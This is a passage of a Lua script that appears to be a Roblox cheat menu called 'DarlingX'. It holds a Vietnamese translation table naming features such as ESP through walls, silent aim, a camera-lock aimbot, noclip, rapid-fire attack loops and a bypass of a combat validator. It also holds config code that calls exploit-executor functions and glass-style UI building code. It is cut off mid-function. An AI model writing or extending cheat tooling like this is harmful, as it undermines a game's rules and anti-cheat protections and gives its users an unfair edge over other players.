        ["Displays movable on-screen JUMP button for touch"] = "Hien thi nut NHAY di dong tren man hinh cho cam ung",
        ["Displays movable on-screen action button for Sanguine Z"] = "Hien thi nut noi hanh dong cho chieu Sanguine Z",
        ["Displays movable on-screen button to toggle camera lock"] = "Hien thi nut di dong tren man hinh de khoa camera",
        ["Displays movable on-screen toggle for Dragon Gun M1"] = "Hien thi nut chuyen di dong tren man hinh cho Dragon Gun M1",
        ["Displays movable on-screen toggle for camera lock"] = "Hien thi nut noi di chuyen duoc de bat tat khoa camera",
        ["Displays player bounty or honor value in millions"] = "Hien thi tien truy na hoac danh du theo trieu",
        ["Displays targeting circle boundary on screen"] = "Hien thi vong tron ngam muc tieu tren man hinh",
        ["Distance Indicator"] = "Khoang cach",
        ["Dragon Gun M1"] = "Dragon Gun M1",
        ["Dragon Gun M1 Floating Widget"] = "Tien ich noi Dragon Gun M1",
        ["Draws dynamic bounding boxes around enemy players"] = "Ve khung bao quanh nguoi choi dich",
        ["Draws line from bottom of screen to tracked players"] = "Ve duong dan tu duoi man hinh den muc tieu",
        ["E"] = "E",
        ["ESP Style"] = "Kieu ESP",
        ["ESP Text Font Size"] = "Co chu ESP",
        ["ESP Visuals"] = "Hien thi ESP",
        ["Enable All Visuals"] = "Bat tat ca hien thi",
        ["Enable Target Prediction"] = "Bat doan huong muc tieu",
        ["Enable player visual highlights"] = "Bat lam noi bat nguoi choi",
        ["Enables custom movement speed multiplier"] = "Bat he so nhan toc do di chuyen tuy chinh",
        ["Enables high-performance player visual tracking"] = "Bat theo doi nguoi choi hieu nang cao",
        ["English"] = "English",
        ["Equipped Tool / Weapon"] = "Vu khi trang bi",
        ["Equips weapon and casts chosen skill upon Soru animation"] = "Trang bi vu khi va tung chieu ngay khi dung Soru",
        ["Esp"] = "Hien thi",
        ["Executes rapid melee, sword, and fruit attack bursts"] = "Thuc hien chuoi danh cuc nhanh cho can chien, kiem va trai",
        ["Executes rapid primary attacks on all nearby enemies"] = "Thuc hien danh don co ban cuc nhanh vao moi ke dich xung quanh",
        ["F"] = "F",
        ["FACTION"] = "PHE PHAI",
        ["FOV"] = "FOV",
        ["FOV Color"] = "Mau vong FOV",
        ["FOV Position"] = "Vi tri tam FOV",
        ["FOV Radius"] = "Ban kinh FOV",
        ["FOV Thickness"] = "Do day vong FOV",
        ["FPS"] = "KHUNG HINH",
        ["FRUIT"] = "TRAI AC QUY",
        ["Fast Attack"] = "Tan cong nhanh",
        ["Fast Attack (Melee, Sword, Fruit)"] = "Tan cong nhanh (Can chien, Kiem, Trai)",
        ["Fast Flags"] = "Toi uu hoa nhanh",
        ["FFlags 1 (FPS Booster)"] = "FFlags 1 (Tang cuong FPS)",
        ["120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris"] = "Gioi han 120 FPS, ket cau nhua min, xoa suong mu va an manh vo",
        ["No Animations"] = "Khong Hoat Anh",
        ["Stops non-attack animations to fix sideways bug and character freezes"] = "Dung cac hoat anh khong tan cong de sua loi bi dung hinh",
        ["Fast Flags & Engine Tuning"] = "Fast Flags va Toi uu he thong",
        ["Field of View"] = "Vung tam nhin",
        ["Field of View (FOV Customization)"] = "Goc nhin (Tuy chinh FOV)",
        ["Forward velocity boost"] = "Day van toc ve phia truoc",
        ["French"] = "Tieng Phap",
        ["Fruit"] = "Trai quy",
        ["Game Stats"] = "Thong so tro choi",
        ["Glass Interface & Visual Effects"] = "Hieu ung kinh va Giao dien",
        ["Glass Transparency"] = "Do trong suot cua kinh",
        ["Green"] = "Xanh la",
        ["Gun"] = "Sung",
        ["Gun Aura (Dragon Gun M1)"] = "Gun Aura (Dragon Gun M1)",
        ["Head"] = "Dau",
        ["High jump leap"] = "Cu nhay vao khong trung",
        ["High-distance forward velocity boost with keybind Z"] = "Tang toc tien ve phia truoc khoang cach xa bang phim Z",
        ["Home"] = "Trang chu",
        ["HumanoidRootPart"] = "HumanoidRootPart",
        ["Identifies equipped Devil Fruit power (Kitsune, Portal, etc.)"] = "Nhan dien trai ac quy dang dung",
        ["Illuminates full player character models through walls"] = "Chieu sang mo hinh nguoi choi qua tuong",
        ["Immunity to lava damage"] = "Mien nhiem sat thuong nham thach",
        ["In-Game Attributes"] = "Chi so trong Game",
        ["Increase dash distance"] = "Tang khoang cach luot",
        ["Infinite Jump"] = "Nhay vo han",
        ["Infinite Soru"] = "Soru vo han",
        ["Interface Effects"] = "Hieu ung giao dien",
        ["Interface Language"] = "Ngon ngu giao dien",
        ["Interface Scale"] = "Ti le giao dien",
        ["Jump continuously in mid-air"] = "Nhay lien tuc tren khong",
        ["Keep Armament Haki active"] = "Tu dong kich hoat Haki Vu Trang",
        ["LEVEL"] = "CAP DO",
        ["Language"] = "Ngon ngu",
        ["Language & Localization"] = "Ngon ngu va Ban dia hoa",
        ["Large (120%)"] = "Lon (120%)",
        ["Load Configuration Profile"] = "Tai cau hinh",
        ["Load Config"] = "Tai Cau hinh",
        ["Lock camera onto enemy"] = "Khoa camera vao muc tieu",
        ["Locks camera perspective directly onto focused enemy player"] = "Khoa goc nhin camera truc tiep vao nguoi choi doi thu",
        ["Looking At Me"] = "Dang nhin toi",
        ["Low HP"] = "Mau thap nhat",
        ["Master ESP"] = "Tong the ESP",
        ["Master ESP Toggle"] = "Bat tat ESP chinh",
        ["Master Visuals & Chams"] = "Hinh anh chinh va Chams",
        ["Max Range"] = "Tam xa toi da",
        ["Max Soru Range"] = "Tam xa Soru toi da",
        ["Melee"] = "Can chien",
        ["Misc"] = "Khac",
        ["Mouse"] = "Con tro chuot",
        ["Move smoothly through structures and physical obstacles"] = "Di chuyen muot ma qua cac cong trinh va vat can",
        ["Movement"] = "Di chuyen",
        ["Movement & Agility (PvP Physics)"] = "Di chuyen va Linh hoat (Vat ly PvP)",
        ["Multiplies dash distance for high-speed repositioning"] = "Nhan khoang cach luot de thay doi vi tri nhanh chong",
        ["Multiplies jump impulse for vertical escape and aerial combat"] = "Nhan luc nhay de thoat hiem tren cao va khong chien",
        ["NPC Silent Aim"] = "Silent Aim NPC",
        ["Nearest"] = "Gan nhat",
        ["Nearest Player"] = "Nguoi choi gan nhat",
        ["Neon Rain Layer"] = "Hieu ung mua Neon Cyber",
        ["Next (›)"] = "Tiep theo (›)",
        ["Noclip Wallpass"] = "Noclip di xuyen tuong",
        ["None"] = "Khong co",
        ["Official Community & Discord"] = "Cong dong chinh thuc va Discord",
        ["Orange"] = "Cam",
        ["Overhead Billboard"] = "Bang ten tren dau",
        ["PING"] = "DO TRE",
        ["PLAYERS"] = "NGUOI CHOI",
        ["Pass through walls and objects"] = "Di xuyen qua tuong va vat the",
        ["Performance"] = "Hieu nang",
        ["Performance & Network"] = "Hieu nang va Mang",
        ["Pink"] = "Hong",
        ["Player"] = "Nguoi choi",
        ["Player 2D Boxes"] = "Khung 2D nguoi choi",
        ["Player Bounty Tracker"] = "Tien thuong nguoi choi",
        ["Player Chams & Tracers"] = "Chams va Duong ke nguoi choi",
        ["Player Chams (Highlight)"] = "Chams nguoi choi (Highlight)",
        ["Player Health Status"] = "Mau nguoi choi",
        ["Player Level Display"] = "Cap do nguoi choi",
        ["Player Names"] = "Ten nguoi choi",
        ["Player Profile"] = "Ho so nguoi choi",
        ["Player Profile & Account"] = "Ho so nguoi choi va Tai khoan",
        ["Player Radar Elements"] = "Phan tu radar nguoi choi",
        ["Player Silent Aim"] = "Silent Aim nguoi choi",
        ["Player Tracer Color"] = "Mau duong dan nguoi choi",
        ["Player Tracers"] = "Duong dan den nguoi choi",
        ["Portuguese"] = "Tieng Bo Dao Nha",
        ["Prediction Amount"] = "Muc doan truoc",
        ["Premium User  •  Active Session"] = "Nguoi dung Premium  •  Phien hoat dong",
        ["Preset: Crimson Slayer"] = "Mau: Sat Thu Do Tham",
        ["Preset: Cyberpunk Violet"] = "Mau: Tim Cyberpunk",
        ["Preset: Emerald Forest"] = "Mau: Rung Ngoc Luc Bao",
        ["Preset: Shorekeeper Cyan"] = "Mau: Shorekeeper Xanh Lo",
        ["Previous (‹)"] = "Truoc do (‹)",
        ["Purple"] = "Tim",
        ["PvP"] = "PvP",
        ["PvP Tech, Camlock & Universal Keybinds"] = "Cong nghe PvP, Camlock va Phim tat",
        ["Q"] = "Q",
        ["Quick Actions"] = "Hanh dong nhanh",
        ["R"] = "R",
        ["RACE"] = "CHUNG TOC",
        ["Radar Elements"] = "Thanh phan Radar",
        ["Rainbow"] = "Cau vong",
        ["Rainbow Chroma Speed"] = "Toc do cau vong Chroma",
        ["Raindrop Density"] = "Mat do hat mua",
        ["Random (Shuffle)"] = "Ngau nhien",
        ["Rapid fire M1 gun shots"] = "Ban dan M1 sieu toc",
        ["Rapid melee and weapon strikes"] = "Tan cong can chien toc do cao",
        ["Rapid weapon hit bursts"] = "Danh lien hoan vu khi",
        ["Rapid-fire gun attack loop targeting nearest combatant"] = "Vong lap ban sung toc do cao vao muc tieu gan nhat",
        ["Red"] = "Do",
        ["Redirect skills toward enemy players"] = "Chuyen huong chieu thuc toi nguoi choi",
        ["Redirect skills toward mobs and bosses"] = "Chuyen huong chieu thuc toi quai va trum",
        ["Redirects Flashstep teleport directly to enemy player"] = "Dich chuyen Soru truc tiep toi nguoi choi muc tieu",
        ["Redirects skills and attacks towards enemy players"] = "Dinh huong ky nang va don danh ve phia nguoi choi dich",
        ["Redirects skills and attacks towards mobs and bosses"] = "Dinh huong ky nang va don danh ve phia quai va trum",
        ["Rejoin Current Server"] = "Vao lai may chu hien tai",
        ["Remove flashstep cooldown"] = "Xoa thoi gian hoi chieu toc bien",
        ["Removes cooldown delay and bypasses stamina limits"] = "Xoa thoi gian hoi chieu va khong ton the luc",
        ["Renders hardware 3D Beams and 2D lines to target"] = "Ve tia 3D va duong 2D den muc tieu",
        ["Reset All Settings to Factory Defaults"] = "Khoi phuc mac dinh goc",
        ["Reset Configuration Profile"] = "Khoi phuc cau hinh goc",
        ["Reset Config"] = "Dat lai Cau hinh",
        ["Configuration profile reset to defaults."] = "Ho so cau hinh da duoc dat lai ve mac dinh.",
        ["Reset Theme to Purple"] = "Dat lai giao dien mau tim",
        ["Sanguine Boost"] = "Tang toc Sanguine",
        ["Sanguine Boost Floating Widget"] = "Nut noi Sanguine Z",
        ["Sanguine Keybind"] = "Phim tat Sanguine",
        ["Save Configuration Profile"] = "Luu cau hinh",
        ["Save Config"] = "Luu Cau hinh",
        ["Selected Player"] = "Nguoi choi da chon",
        ["Server Hop (Fast)"] = "Chuyen may chu (Nhanh)",
        ["Show FOV Circle"] = "Hien thi vong FOV",
        ["Show Tracers"] = "Hien thi duong dan huong",
        ["Shows distance measurement in studs below player feet"] = "Hien thi khoang cach bang studs duoi chan",
        ["Shows player rank and numerical level tag"] = "Hien thi thu hang va cap do nguoi choi",
        ["Shows weapon, sword, fruit or gun held by the player"] = "Hien thi vu khi, kiem, sung hoac trai dang cam",
        ["Silent Aim"] = "Ban tu dong",
        ["Skill Blacklist"] = "Danh sach ky nang chan",
        ["Skill Delay"] = "Do tre ky nang",
        ["Skill Redirection Blacklist"] = "Danh sach den ky nang",
        ["Soru"] = "Soru",
        ["Soru Aimbot"] = "Soru Aimbot",
        ["Soru Combat Aimbot"] = "Aimbot Soru",
        ["Soru Flashstep Engine"] = "Dong co Soru Flashstep",
        ["Soru Skill Combo"] = "Combo ky nang Soru",
        ["Soru Skill Combo Automation"] = "Tu dong Combo ky nang Soru",
        ["Soru Target Mode"] = "Che do muc tieu Soru",
        ["Spanish"] = "Tieng Tay Ban Nha",
        ["Spawns water surface collider allowing sprint across oceans"] = "Tao mat san nuoc cho phep chay tren bien",
        ["Speed up player movement"] = "Tang toc do di chuyen nguoi choi",
        ["Standard (100%)"] = "Tieu chuan (100%)",
        ["Subtle (50%)"] = "Tinh te (50%)",
        ["Super Jump"] = "Sieu nhay",
        ["Super Jump Floating Widget"] = "Tien ich noi Sieu Nhay",
        ["Super Jump Force"] = "Luc sieu nhay",
        ["Sword"] = "Kiem",
        ["System Info"] = "Thong tin he thong",
        ["T"] = "T",
        ["Target Hitbox"] = "Vung va cham muc tieu",
        ["Target Player Selection"] = "Chon nguoi choi muc tieu",
        ["Target Priority"] = "Uu tien muc tieu",
        ["Target Selection & Aim Mode"] = "Chon muc tieu va Che do ngam",
        ["Target Tracers"] = "Duong ke chi muc tieu",
        ["Teleport soru directly to enemy"] = "Dich chuyen soru thang vao ke thu",
        ["Theme Presets"] = "Mau giao dien san",
        ["Theme Reset"] = "Dat lai giao dien",
        ["Themes"] = "Giao dien",
        ["Toggle Rainbow Chroma Mode"] = "Bat che do mau cau vong Chroma",
        ["Toggle animated falling cyber rain streaks"] = "Bat tat hieu ung mua cong nghe chuyen dong",
        ["Tracer Color"] = "Mau duong dan huong",
        ["Tracer Mode"] = "Che do duong dan huong",
        ["Tracer Origin"] = "Diem bat dau duong dan",
        ["Tracer Thickness"] = "Do day duong dan huong",
        ["Tracers"] = "Duong dan huong",
        ["Trigger Super Jump"] = "Kich hoat Sieu nhay",
        ["Typography Font"] = "Kieu phong chu",
        ["Typography Studio"] = "Phong chu hien thi",
        ["UPTIME"] = "THOI GIAN CHAY",
        ["Ultra fast burst firing with CombatController validator"] = "Ban lien thanh sieu nhanh voi trinh xac thuc CombatController",
        ["UpperTorso"] = "Than tren",
        ["Use skill instantly after Soru"] = "Tung ky nang ngay lap tuc sau Soru",
        ["V"] = "V",
        ["Vietnamese"] = "Tieng Viet",
        ["Visuals"] = "Hien thi",
        ["Vitality & Energy Status"] = "Trang thai Mau va Nang luong",
        ["Walk on Water"] = "Di tren mat nuoc",
        ["Walk on ocean surface"] = "Di chuyen tren mat bien",
        ["WalkSpeed Value"] = "Gia tri toc do",
        ["Wallpaper"] = "Hinh nen",
        ["Wallpapers"] = "Danh sach hinh nen",
        ["White"] = "Trang",
        ["World & Client Optimization"] = "Toi uu hoa the gioi va ung dung",
        ["X"] = "X",
        ["Yellow"] = "Vang",
        ["Z"] = "Z",
        ["Z Sanguine Boost"] = "Tang toc Sanguine Z",
        ["B1 Hold Time (s)"] = "B1 Thoi gian giu (s)",
        ["B1 Mode"] = "B1 Che do",
        ["B1 Post Jumps"] = "B1 Buoc nhay phu",
        ["B1 Skill Key"] = "B1 Phim chieu",
        ["B1 Weapon"] = "B1 Vu khi",
        ["B2 Hold Time (s)"] = "B2 Thoi gian giu (s)",
        ["B2 Mode"] = "B2 Che do",
        ["B2 Post Jumps"] = "B2 Buoc nhay phu",
        ["B2 Skill Key"] = "B2 Phim chieu",
        ["B2 Weapon"] = "B2 Vu khi",
        ["B3 Hold Time (s)"] = "B3 Thoi gian giu (s)",
        ["B3 Mode"] = "B3 Che do",
        ["B3 Post Jumps"] = "B3 Buoc nhay phu",
        ["B3 Skill Key"] = "B3 Phim chieu",
        ["B3 Weapon"] = "B3 Vu khi",
        ["B4 Hold Time (s)"] = "B4 Thoi gian giu (s)",
        ["B4 Mode"] = "B4 Che do",
        ["B4 Post Jumps"] = "B4 Buoc nhay phu",
        ["B4 Skill Key"] = "B4 Phim chieu",
        ["B4 Weapon"] = "B4 Vu khi",
        ["B5 Hold Time (s)"] = "B5 Thoi gian giu (s)",
        ["B5 Mode"] = "B5 Che do",
        ["B5 Post Jumps"] = "B5 Buoc nhay phu",
        ["B5 Skill Key"] = "B5 Phim chieu",
        ["B5 Weapon"] = "B5 Vu khi",
        ["B6 Hold Time (s)"] = "B6 Thoi gian giu (s)",
        ["B6 Mode"] = "B6 Che do",
        ["B6 Post Jumps"] = "B6 Buoc nhay phu",
        ["B6 Skill Key"] = "B6 Phim chieu",
        ["B6 Weapon"] = "B6 Vu khi",
        ["Block 1 Enabled"] = "Bat Khoi 1",
        ["Block 2 Enabled"] = "Bat Khoi 2",
        ["Block 3 Enabled"] = "Bat Khoi 3",
        ["Block 4 Enabled"] = "Bat Khoi 4",
        ["Block 5 Enabled"] = "Bat Khoi 5",
        ["Block 6 Enabled"] = "Bat Khoi 6",
        ["Combo Sequence (6 Blocks)"] = "Chuoi Combo (6 Khoi)",
        ["Display real-time FPS and ping overlay top-left"] = "Hien thong so FPS va ping o goc tren ben trai",
        ["Displays on-screen one-touch button to trigger combo"] = "Hien nut mot cham tren man hinh de kich hoat combo",
        ["Do not target allied players"] = "Khong ngam vao dong doi",
        ["Do not target players inside safe zones"] = "Khong ngam vao nguoi trong vung an toan",
        ["Do not target players with PvP disabled"] = "Khong ngam vao nguoi choi tat PvP",
        ["Enable step 1 in combo"] = "Kich hoat buoc 1 trong combo",
        ["Enable step 2 in combo"] = "Kich hoat buoc 2 trong combo",
        ["Enable step 3 in combo"] = "Kich hoat buoc 3 trong combo",
        ["Enable step 4 in combo"] = "Kich hoat buoc 4 trong combo",
        ["Enable step 5 in combo"] = "Kich hoat buoc 5 trong combo",
        ["Enable step 6 in combo"] = "Kich hoat buoc 6 trong combo",
        ["Enables keyboard trigger and loop execution"] = "Kich hoat phim tat va chay vong lap",
        ["Fly"] = "Bay",
        ["Fly Speed"] = "Toc do bay",
        ["Glide freely through the air"] = "Luon tu do tren khong trung",
        ["Ignore Allies"] = "Bo qua dong doi",
        ["Ignore PvP Off"] = "Bo qua nguoi tat PvP",
        ["Ignore Safe Zone"] = "Bo qua Vung an toan",
        ["Loop Sequence"] = "Lap lai chuoi",
        ["Macro"] = "Macro",
        ["Macro Controller"] = "Bo dieu khien Macro",
        ["Macro Enabled"] = "Bat Macro",
        ["Macro Floating Widget"] = "Nut Macro noi tren man hinh",
        ["Macro Slot"] = "O chua Macro",
        ["Repeat sequence continuously until stopped"] = "Lap lai lien tuc cho den khi dung",
        ["Show FPS & Ping"] = "Hien FPS va Ping",
        ["Start Combo Sequence"] = "Bat dau chuoi Combo",
        ["Stop Combo Sequence"] = "Dung chuoi Combo",
        ["Trigger Key (PC)"] = "Phim kich hoat (PC)",
    },
}local TranslatableLabels = {}
local CurrentLanguage = "English"

local function RegisterTranslatable(label, englishText)
    if not label or not englishText then return end
    table.insert(TranslatableLabels, {
        label = label,
        original = englishText
    })
    if CurrentLanguage ~= "English" then
        local langDict = TRANSLATIONS_DICT[CurrentLanguage]
        if langDict and langDict[englishText] then
            pcall(function() label.Text = langDict[englishText] end)
        end
    end
end

local function ApplyLanguage(lang)
    CurrentLanguage = lang
    local langDict = TRANSLATIONS_DICT[lang]
    for _, item in ipairs(TranslatableLabels) do
        if item.label and item.label.Parent then
            if lang == "English" or not langDict then
                pcall(function() item.label.Text = item.original end)
            else
                pcall(function() item.label.Text = langDict[item.original] or item.original end)
            end
        end
    end
    for _, ref in ipairs(ChoiceRefresherList) do
        pcall(ref)
    end
    if TriggerAutoSave then TriggerAutoSave() end
end

local CONFIG_PATHS = {
    "DarlingX_Config.json",
    "darling_config.json",
    "darling_hub_config.json",
    "darling_hub/config.json"
}
local CONFIG_FILE = "DarlingX_Config.json"
local CONFIG_FALLBACK = "darling_config.json"
local autoSaveThread = nil
local suspendSave = false

local function getExecutorFunc(name)
    local candidates = {
        name,
        name:lower(),
        (name:sub(1,1):lower() .. name:sub(2)),
    }
    for _, n in ipairs(candidates) do
        if type(rawget(_G, n)) == "function" then return rawget(_G, n) end
        if getgenv then
            local ok, g = pcall(getgenv)
            if ok and type(g) == "table" and type(rawget(g, n)) == "function" then
                return rawget(g, n)
            end
        end
        if syn and type(syn) == "table" and type(rawget(syn, n)) == "function" then
            return rawget(syn, n)
        end
        if fluxus and type(fluxus) == "table" and type(rawget(fluxus, n)) == "function" then
            return rawget(fluxus, n)
        end
        local ok, val = pcall(function() return getfenv()[n] end)
        if ok and type(val) == "function" then return val end
    end
    return nil
end

local function safeWriteFile(arg1, arg2)
    local content = arg2 or arg1
    local specifiedPath = (arg2 and arg1) or nil
    local fn = (type(writefile) == "function" and writefile) or getExecutorFunc("writefile") or getExecutorFunc("writeFile")
    if not fn then return false, "writefile not supported" end

    pcall(function()
        local mkf = (type(makefolder) == "function" and makefolder) or getExecutorFunc("makefolder")
        local isf = (type(isfolder) == "function" and isfolder) or getExecutorFunc("isfolder")
        if mkf and isf and not isf("darling_hub") then
            pcall(mkf, "darling_hub")
        end
    end)

    local targetPaths = {}
    if specifiedPath then table.insert(targetPaths, specifiedPath) end
    for _, p in ipairs(CONFIG_PATHS) do
        if p ~= specifiedPath then table.insert(targetPaths, p) end
    end

    local anySuccess = false
    local lastErr = nil
    for _, p in ipairs(targetPaths) do
        local ok, err = pcall(fn, p, content)
        if ok then
            anySuccess = true
        else
            lastErr = err
        end
    end
    return anySuccess, lastErr
end

local function safeReadFile(specifiedPath)
    local fn = (type(readfile) == "function" and readfile) or getExecutorFunc("readfile") or getExecutorFunc("readFile")
    if not fn then return nil end

    local targetPaths = {}
    if specifiedPath then table.insert(targetPaths, specifiedPath) end
    for _, p in ipairs(CONFIG_PATHS) do
        if p ~= specifiedPath then table.insert(targetPaths, p) end
    end

    for _, p in ipairs(targetPaths) do
        local ok, content = pcall(fn, p)
        if ok and type(content) == "string" and #content > 1 then
            local decOk, decData = pcall(function() return HttpService:JSONDecode(content) end)
            if decOk and type(decData) == "table" then
                return content, decData
            end
        end
    end
    return nil
end


local SaveConfigProfile = nil
local TriggerAutoSave = nil
local LoadConfigProfile = nil
local ResetConfigProfile = nil

local UI_TOGGLES = {}
local UI_SLIDERS = {}
local UI_CHOICES = {}
local UI_INPUTS = {}
local ChoiceRefresherList = {}


local function BuildTabEntity(tabId, tabName, lucideName, orderIndex)
    local minH = TAB_MIN_CANVAS[tabId] or 600
    local page = Instance.new("ScrollingFrame", PageContainer)
    page.Name = tabId .. "Page"
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.ScrollBarThickness = 5
    page.ScrollBarImageColor3 = CurrentAccent
    page.ScrollBarImageTransparency = 0.2
    page.AutomaticCanvasSize = Enum.AutomaticSize.None
    page.CanvasSize = UDim2.new(0, 0, 0, minH)
    page.ScrollingDirection = Enum.ScrollingDirection.Y
    page.ElasticBehavior = Enum.ElasticBehavior.Always
    page.ClipsDescendants = true
    page.Active = true
    page.ScrollingEnabled = true
    page.Visible = false
    page.ZIndex = 10

    local pList = Instance.new("UIListLayout", page)
    pList.SortOrder = Enum.SortOrder.LayoutOrder
    pList.Padding = UDim.new(0, 6)
    Instance.new("UIPadding", page).PaddingRight = UDim.new(0, 4)

    pList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        UpdatePageCanvas(page)
    end)

    -- Dock Button (Luxury Glass Pill Capsule)
    local dockBtn = Instance.new("TextButton", BottomDock)
    dockBtn.Name = "DockBtn_" .. tabId
    dockBtn.LayoutOrder = orderIndex
    dockBtn.Size = UDim2.new(1, 0, 0, 28)
    dockBtn.BackgroundColor3 = Color3.fromRGB(20, 16, 32)
    dockBtn.BackgroundTransparency = 0.55
    dockBtn.AutoButtonColor = false
    dockBtn.Text = ""
    dockBtn.Active = true
    dockBtn.Selectable = true
    dockBtn.ZIndex = 16
    Instance.new("UICorner", dockBtn).CornerRadius = UDim.new(0, 8)

    local btnStroke = Instance.new("UIStroke", dockBtn)
    btnStroke.Color = Color3.fromRGB(48, 42, 68)
    btnStroke.Thickness = 0.8
    btnStroke.Transparency = 0.4

    -- Left Active Pill Indicator
    local activePill = Instance.new("Frame", dockBtn)
    activePill.Size = UDim2.new(0, 3, 0, 14)
    activePill.Position = UDim2.new(0, 2, 0.5, -7)
    activePill.BackgroundColor3 = CurrentAccent
    activePill.BackgroundTransparency = 1
    activePill.Active = false
    activePill.ZIndex = 17
    Instance.new("UICorner", activePill).CornerRadius = UDim.new(1, 0)
    RegisterThemeFill(activePill)

    local iconImg = Instance.new("ImageLabel", dockBtn)
    iconImg.Size = UDim2.new(0, 15, 0, 15)
    iconImg.Position = UDim2.new(0, 7, 0.5, -7)
    iconImg.BackgroundTransparency = 1
    iconImg.ImageColor3 = Color3.fromRGB(200, 195, 225)
    iconImg.Active = false
    iconImg.ZIndex = 17
    ApplyTabIcon(iconImg, tabId, lucideName)

    local tabLabel = Instance.new("TextLabel", dockBtn)
    tabLabel.Size = UDim2.new(1, -26, 1, 0)
    tabLabel.Position = UDim2.new(0, 25, 0, 0)
    tabLabel.BackgroundTransparency = 1
    tabLabel.Text = tabName
    RegisterTranslatable(tabLabel, tabName)
    tabLabel.Font = Enum.Font.GothamBold
    tabLabel.TextSize = 9.5
    tabLabel.TextColor3 = Color3.fromRGB(240, 235, 255)
    tabLabel.TextXAlignment = Enum.TextXAlignment.Left
    tabLabel.TextTruncate = Enum.TextTruncate.AtEnd
    tabLabel.Active = false
    tabLabel.ZIndex = 17

    dockBtn.MouseEnter:Connect(function()
        if not (DockButtons[tabId] and DockButtons[tabId].isSelected) then
            TweenService:Create(dockBtn, TweenInfo.new(0.15), { BackgroundTransparency = 0.35 }):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.15), { Color = CurrentAccent }):Play()
        end
    end)
    dockBtn.MouseLeave:Connect(function()
        if not (DockButtons[tabId] and DockButtons[tabId].isSelected) then
            TweenService:Create(dockBtn, TweenInfo.new(0.15), { BackgroundTransparency = 0.55 }):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.15), { Color = Color3.fromRGB(48, 42, 68) }):Play()
        end
    end)

    local function handleSelect()
        SelectTabById(tabId)
    end

    ConnectButton(dockBtn, handleSelect)

    Pages[tabId] = page
    DockButtons[tabId] = {
        btn = dockBtn,
        stroke = btnStroke,
        pill = activePill,
        icon = iconImg,
        label = tabLabel,
        select = handleSelect,
        isSelected = false
    }
    return page
end

-- Upfront Batch Creation of All Tabs in Manifest
for _, tabMeta in ipairs(TABS_MANIFEST) do
    TabOrderCounter = TabOrderCounter + 1
    BuildTabEntity(tabMeta.id, tabMeta.name, tabMeta.icon, TabOrderCounter)
end

if Pages["Config"] then Pages["Misc"] = Pages["Config"] end
if Pages["Themes"] then Pages["Settings"] = Pages["Themes"] end

_G.DarlingX.Pages = Pages
_G.DarlingX.SelectTab = SelectTabById

-- Registration Helper (returns pre-built page, safe against runtime ordering)
local function RegisterTab(tabId, tabName, lucideName)
    if tabId == "Settings" then tabId = "Themes" end
    if tabId == "Misc" then tabId = "Config" end
    if Pages[tabId] then
        return Pages[tabId]
    end
    TabOrderCounter = TabOrderCounter + 1
    return BuildTabEntity(tabId, tabName or tabId, lucideName, TabOrderCounter)
end

-- ============================================================
-- LUXURY GLASS UI COMPONENTS
-- ============================================================
local PageCardCounters = {}
local CardElementCounters = {}

local function CreateCard(parentPage, cardTitle)
    local cCount = (PageCardCounters[parentPage] or 0) + 1
    PageCardCounters[parentPage] = cCount
    local card = Instance.new("Frame", parentPage)
    card.Name = "Card_" .. (cardTitle and cardTitle:gsub("[^%w_]+", "_") or tostring(cCount))
    card.LayoutOrder = cCount
    card.Size = UDim2.new(1, 0, 0, 36)
    card.AutomaticSize = Enum.AutomaticSize.None
    card.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
    card.BackgroundTransparency = 0.65
    card.ClipsDescendants = false
    card.Active = false
    card.ZIndex = 10
    CardElementCounters[card] = 0
    table.insert(GlassFrames, card)
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", card)
    stroke.Color = CurrentAccent
    stroke.Thickness = 0.9
    stroke.Transparency = 0.65
    RegisterThemeStroke(stroke)

    local pad = Instance.new("UIPadding", card)
    pad.PaddingTop = UDim.new(0, 7)
    pad.PaddingBottom = UDim.new(0, 7)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 8)

    local list = Instance.new("UIListLayout", card)
    list.SortOrder = Enum.SortOrder.LayoutOrder
    list.Padding = UDim.new(0, 5)

    if cardTitle then
        local eCount = (CardElementCounters[card] or 0) + 1
        CardElementCounters[card] = eCount
        local header = Instance.new("TextLabel", card)
        header.Name = "CardHeader"
        header.LayoutOrder = eCount
        header.Size = UDim2.new(1, 0, 0, 14)
        header.BackgroundTransparency = 1
        header.Text = cardTitle
        RegisterTranslatable(header, cardTitle)
        header.Font = Enum.Font.GothamBold
        header.TextSize = 9.5
        header.TextColor3 = CurrentAccent
        header.TextXAlignment = Enum.TextXAlignment.Left
        header.Active = false
        header.ZIndex = 11
        RegisterThemeText(header)
    end

    list:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        UpdateCardGeometry(card)
    end)
    card.ChildAdded:Connect(function()
        task.defer(function() UpdateCardGeometry(card) end)
    end)

    task.defer(function() UpdateCardGeometry(card) end)
    return card
end

-- Premium Interactive Glass Button
local function AddButton(parentCard, btnText, callback)
    local eCount = (CardElementCounters[parentCard] or 0) + 1
    CardElementCounters[parentCard] = eCount
    local btn = Instance.new("TextButton", parentCard)
    btn.Name = "Btn_" .. (btnText and btnText:sub(1, 16):gsub("[^%w_]+", "_") or "Button")
    btn.LayoutOrder = eCount
    btn.Size = UDim2.new(1, 0, 0, 28)
    btn.BackgroundColor3 = Color3.fromRGB(22, 18, 32)
    btn.BackgroundTransparency = 0.45
    btn.Text = btnText
    RegisterTranslatable(btn, btnText)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 9.5
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.AutoButtonColor = false
    btn.Active = true
    btn.Selectable = true
    btn.ZIndex = 12
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

    local bStroke = Instance.new("UIStroke", btn)
    bStroke.Color = CurrentAccent
    bStroke.Thickness = 1
    bStroke.Transparency = 0.5
    RegisterThemeStroke(bStroke)

    ConnectButton(btn, function()
        TweenService:Create(btn, TweenInfo.new(0.1), { BackgroundTransparency = 0.15 }):Play()
        TweenService:Create(bStroke, TweenInfo.new(0.1), { Transparency = 0.1 }):Play()
        task.delay(0.12, function()
